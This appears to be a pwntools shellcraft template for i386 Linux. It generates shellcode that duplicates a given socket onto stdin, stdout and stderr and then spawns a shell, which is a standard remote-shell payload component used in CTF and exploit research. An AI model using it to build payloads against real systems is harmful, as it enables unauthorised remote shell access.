<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft.i386 import linux %>
<%page args="sock = 'ebp'"/>
<%docstring>
Args: [sock (imm/reg) = ebp]
    Duplicates sock to stdin, stdout and stderr and spawns a shell.
</%docstring>


${linux.dupio(sock)}

${linux.sh()}
